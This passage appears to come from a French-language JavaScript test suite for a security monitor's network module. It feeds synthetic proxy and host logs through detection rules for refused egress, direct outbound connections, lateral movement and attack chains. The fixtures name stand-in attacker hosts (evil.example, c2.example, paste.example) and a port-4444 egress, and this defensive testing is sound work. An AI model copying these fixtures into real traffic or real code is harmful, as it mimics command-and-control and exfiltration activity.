  fs.writeFileSync(fichiers.hote, '');
  const r = createReseau({ store: v.store, ...fichiers, now: v.now });
  const ecrire = (k, ...lignes) => fs.appendFileSync(fichiers[k], lignes.map(l => `${l}\n`).join(''));
  return { r, fichiers, ecrire };
}

test('événements réseau : sortie refusée (moyen, puis haut au-delà de 3 noms en 1 h), sortie directe et flux du site (source unique), flux répétés d’un autre conteneur', t => {
  const v = vigieOf(t);
  const { r, ecrire } = reseauOf(t, v);
  assert.equal(sourceOf({ composant: 'réseau' }), 'reseau');
  ecrire('mandataire', L.battement(), L.accepte('nicephos-x1.zitadel.cloud'), L.refus('evil.example'), L.refus('evil.example'), L.refus('evil.example'),
    JSON.stringify({ t: '2026-10-20T10:05:00.000Z', evt: 'echec', hote: 'freetsa.org', port: 443, raison: 'connexion impossible (ETIMEDOUT)', client: '172.29.44.130' }));
  assert.equal(r.lire(), 1, 'trois refus du même nom : un événement ; un échec d’un nom permis : aucun');
  assert.equal(v.store.setting.get('reseau_etat').mandataire.echecs, 1);
  const [e] = v.events('reseau_sortie_refusee');
  assert.equal(e.composant, 'réseau');
  assert.equal(e.confiance, 'constaté');
  assert.equal(e.severity, 'moyen');
  assert.equal(e.ip, null, 'aucune adresse de visiteur');
  assert.deepEqual(e.detail, { hote: 'evil.example', port: 443, raison: 'hors liste', client: '172.29.44.130', client_nom: 'site', nombre: 2 });
  let a = v.alerts().find(x => x.regle === 'sigma.reseau_sortie_refusee');
  assert.equal(a.gravite, 'moyen');
  assert.equal(a.entite_kind, 'site');
  assert.equal(a.entite_key, 'sortie');
  assert.equal(r.lire(), 0, 'rien de relu deux fois');
  assert.deepEqual(Object.keys(v.store.setting.get('reseau_noms_acceptes')), ['nicephos-x1.zitadel.cloud:443']);
  // Trois autres noms différents dans l'heure : plus de trois → haut.
  v.clock.t += 10 * 60e3;
  ecrire('mandataire', L.refus('c2.example'), L.refus('paste.example'));
  r.lire();
  assert.equal(v.alerts().filter(x => x.regle === 'sigma.reseau_sorties_variees').length, 0, 'trois noms : pas encore');
  ecrire('mandataire', L.refus('transfer.example'));
  r.lire();
  a = v.alerts().find(x => x.regle === 'sigma.reseau_sorties_variees');
  assert.equal(a.gravite, 'haut');
  assert.equal(a.mode, 'alerter');
  // Sortie directe du site, rejetée par l'hôte : haute, source unique, tout de suite.
  ecrire('hote', L.battementHote(), L.sortie(), L.sortie());
  r.lire();
  const [d] = v.events('reseau_sortie_directe');
  assert.deepEqual(d.detail, { source: '172.29.42.30', source_nom: 'site', destination: '198.51.100.66', destination_nom: null, port: 4444, proto: 'tcp', sortie: 'eth0', nombre: 1 });
  a = v.alerts().find(x => x.regle === 'sigma.reseau_sortie_directe');
  assert.equal(a.gravite, 'haut');
  assert.deepEqual(JSON.parse(a.sources), ['reseau']);
  // Le site sonde la console (mouvement latéral) : haute, source unique.
  ecrire('hote', L.flux('172.29.42.30', '172.29.42.20', 4200));
  r.lire();
  assert.equal(v.alerts().find(x => x.regle === 'sigma.reseau_flux_site').gravite, 'haut');
  // La sauvegarde (adresse dynamique de la pile) : un paquet isolé ne fait rien ; trois dans l'heure, oui.
  ecrire('hote', L.flux('172.29.42.131', '172.29.42.40', 5000));
  r.lire();
  assert.equal(v.alerts().filter(x => x.regle === 'sigma.reseau_flux_repetes').length, 0);
  ecrire('hote', L.flux('172.29.42.131', '172.29.42.40', 5001), L.flux('172.29.42.131', '172.29.42.20', 4200));
  r.lire();
  a = v.alerts().find(x => x.regle === 'sigma.reseau_flux_repetes');
  assert.equal(a.entite_key, 'conteneur:pile');
  // État pour la console et la ligne de commande.
  const etat = v.store.setting.get('reseau_etat');
  assert.equal(etat.hote.battement.etat, 'ok');
  assert.ok(etat.mandataire.dernier_battement);
  assert.ok(etat.mandataire.position.pos > 0);
});

test('chaîne DS23 : saisie malveillante ou fichier piégé, puis sortie refusée ou directe dans l’heure → critique', t => {
  const v = vigieOf(t);
  const { r, ecrire } = reseauOf(t, v);
  // Un constat « bas » (HTML inoffensif d'un billet) n'ouvre pas la chaîne.
  v.site('malicious_input', 'bas', { composant: 'site · admin', detail: { objet: 'billet' } });
  v.clock.t += 5 * 60e3;
  ecrire('mandataire', L.refus('evil.example'));
  r.lire();
  assert.equal(v.alerts().filter(x => x.regle === 'sigma.reseau_chaine_attaque').length, 0);
  // Saisie malveillante (moyen) puis, 20 minutes plus tard, une sortie refusée.
  v.clock.t += 2 * 3600e3;
  v.site('malicious_input', 'moyen', { detail: { famille: 'injection de commande' } });
  v.clock.t += 20 * 60e3;
  ecrire('mandataire', L.refus('c2.example'));
  r.lire();
  let a = v.alerts().filter(x => x.regle === 'sigma.reseau_chaine_attaque');
  assert.equal(a.length, 1);
  assert.equal(a[0].gravite, 'critique');
  assert.equal(a[0].entite_key, 'chaine_sortie');
  assert.deepEqual(JSON.parse(a[0].sources), ['reseau', 'site'], 'deux sources : le site et le réseau');
  // Dans l'autre sens : sortie directe, puis fichier piégé dans l'heure.
  v.clock.t += 3 * 3600e3;
  ecrire('hote', L.sortie('172.29.42.30', '198.51.100.70', 443));
  r.lire();
  v.clock.t += 30 * 60e3;
  v.site('upload_rejected', 'haut', { composant: 'site · admin', detail: { raison: 'polyglotte' } });
  a = v.alerts().filter(x => x.regle === 'sigma.reseau_chaine_attaque');
  assert.equal(a.length, 1, 'même alerte, encore ouverte');
  assert.equal(a[0].compteur, 2, 'nouvelle occurrence comptée');
  // Plus d'une heure entre les deux : pas de chaîne.
  v.clock.t += 30 * 3600e3;
  v.site('malicious_input', 'haut');
  v.clock.t += 61 * 60e3;
  ecrire('mandataire', L.refus('autre.example'));
  r.lire();
  assert.equal(v.db.prepare("SELECT COUNT(*) FROM events WHERE type = 'vigie_signal' AND detail LIKE '%reseau_chaine_attaque%'").pluck().get(), 2);
});

test('silence : muet 24 h alors que le site tourne, règles absentes, journal illisible ; rien tant que le site est arrêté', t => {
  const v = vigieOf(t);
  const { r, fichiers, ecrire } = reseauOf(t, v);
  const silences = () => v.events('vigie_reseau_silence').map(e => `${e.detail.journal}:${e.detail.raison}`);
  ecrire('mandataire', L.battement());
  ecrire('hote', L.battementHote());
  r.lire();
  // 25 h sans ligne, site arrêté (aucun battement du site) : rien.
  v.clock.t += 25 * 3600e3;
  r.lire();
  assert.deepEqual(silences(), []);
  // Le site tourne : les deux journaux muets sont signalés, une fois.
  v.site('sys_heartbeat', 'info', { composant: 'site · système', ip: null, ip_net: null });
  r.lire(); r.lire();
  assert.deepEqual(silences(), ['mandataire:aucune ligne depuis 24 h', 'hote:aucune ligne depuis 24 h']);
  assert.ok(v.alerts().find(x => x.regle === 'sigma.reseau_muet'));
  // Les battements reviennent : plus de silence ; règles retirées : signalé tout de suite.
  ecrire('mandataire', JSON.stringify({ t: new Date(v.now()).toISOString(), evt: 'battement' }));
  ecrire('hote', L.battementHote('ok', new Date(v.now()).toISOString()));
  r.lire();
  assert.deepEqual(v.store.setting.get('reseau_silence_signale'), {});
  ecrire('hote', L.battementHote('absentes', new Date(v.now()).toISOString()));
  r.lire();
  assert.equal(silences().at(-1), "hote:règles de l'hôte absentes");
  // Journal illisible (un dossier à la place du fichier) : signalé sans attendre.
  fs.rmSync(fichiers.mandataire);
  fs.mkdirSync(fichiers.mandataire);
  r.lire();
  assert.equal(silences().at(-1), 'mandataire:journal illisible (pas un fichier ordinaire)');
});

test('configuration et ligne de commande : source réseau facultative, chemins absolus, état lisible', t => {
  const v = vigieOf(t);
  const dir = v.dir;
  const env = { VIGIE_DATA_DIR: dir, VIGIE_SITE_BACKUP_DIR: dir, VIGIE_INGEST_KEY: KEY, VIGIE_LOG_KEY: LOG_KEY, VIGIE_DECISIONS_PRIVATE_KEY: VIGIE_KEYS.priv64, VIGIE_DATABASE: path.join(dir, 'vigie.db') };
  assert.equal(loadVigieConfig(env).reseau, null, 'facultative');
  assert.throws(() => loadVigieConfig({ ...env, VIGIE_RESEAU_HOTE: 'reseau/hote.log' }), /chemin absolu/);
  assert.throws(() => loadVigieConfig({ ...env, VIGIE_RESEAU_HOTE: '/reseau/hote.log', VIGIE_RESEAU_NOMS: 'site=x' }), /VIGIE_RESEAU_NOMS/);
  const { fichiers, ecrire } = reseauOf(t, v);
  const config = loadVigieConfig({ ...env, VIGIE_RESEAU_MANDATAIRE: fichiers.mandataire, VIGIE_RESEAU_HOTE: fichiers.hote });
  assert.deepEqual(config.reseau, { mandataire: fichiers.mandataire, hote: fichiers.hote, noms: undefined });
  assert.match(cli(['reseau'], { config: loadVigieConfig(env), now: v.now }), /non réglée/);
  ecrire('mandataire', JSON.stringify({ t: '2026-10-20T09:00:00Z', evt: 'demarrage', noms: ['freetsa.org:443', '*.hf.co:443'] }), L.refus('evil.example'));
  ecrire('hote', L.battementHote(), L.sortie());
  const out = cli(['reseau', '--lire'], { config, now: v.now });
  assert.match(out, /Passage de lecture : 2 événement\(s\) écrit\(s\)\./);
  assert.match(out, /liste autorisée au démarrage : freetsa\.org:443, \*\.hf\.co:443/);
  assert.match(out, /battement des règles 2026-10-20 10:05 UTC \(etat=ok, 15\/15 règles\)/);
  assert.match(out, /Noms refusés \(24 h\) : evil\.example:443 \(hors liste\) ×1/);
  assert.match(out, /Rejets de l’hôte \(24 h\) : site → 198\.51\.100\.66:4444 ×1/);
  assert.match(cli(['reseau', '--lire'], { config, now: v.now }), /Passage de lecture : 0 événement/);
});

test('console : carte « Réseau » de la santé (lu, muet), source « réseau » nommée dans les alertes', t => {
  const v = vigieOf(t);
  const { r, ecrire } = reseauOf(t, v);
  const carte = () => vueSante({ db: v.db, engine: v.engine, switches: createSwitches({ store: v.store, now: v.now }), now: v.now, role: 'admin' }).cartes.find(c => c.id === 'reseau');
  assert.equal(carte().etat.mot, 'Non réglé');
  ecrire('mandataire', JSON.stringify({ t: '2026-10-20T09:00:00Z', evt: 'demarrage', noms: ['freetsa.org:443'] }), L.refus('evil.example'), L.refus('evil.example'));
  ecrire('hote', L.battementHote(), L.sortie());
  r.lire();
  let c = carte();
  assert.equal(c.etat.mot, 'Lu');
  assert.equal(c.cls, '');
  assert.deepEqual(c.kv.map(x => x.dt), ['Mandataire de sortie', 'Rejets de l’hôte', 'Constats (24 h)']);
  assert.match(c.kv[1].sec, /règles en place/);
  assert.equal(c.kv[2].t, '2 sorties refusées · 1 sortie directe · 0 flux hors liste');
  // Règles retirées : muet, en panne, compté dans les écarts.
  ecrire('hote', L.battementHote('absentes', new Date(v.now()).toISOString()));
  r.lire();
  c = carte();
  assert.equal(c.etat.mot, 'Muet');
  assert.equal(c.cls, 'panne');
  assert.match(c.faits, /Rejets de l’hôte.: règles de l’hôte absentes/);
  const s = vueSante({ db: v.db, engine: v.engine, switches: createSwitches({ store: v.store, now: v.now }), now: v.now, role: 'admin' });
  const html = new Eta({ views: fileURLToPath(new URL('../vigie/console/views/', import.meta.url)), autoEscape: true })
    .render('sante', { sante: s, titre: 'Santé', moi: { nom: 'Sébastien', role: 'admin' }, compteurs: {}, csrf: 'x', peut: {} });
  assert.match(html, /class="vg-compo panne" id="reseau"/);
  assert.match(html, /<span class="mot">reseau<\/span>/);
  // Alerte : la source s'appelle « réseau ».
  const a = v.alerts().find(x => x.regle === 'sigma.reseau_sortie_directe');
  assert.deepEqual(JSON.parse(a.sources), ['reseau']);
});
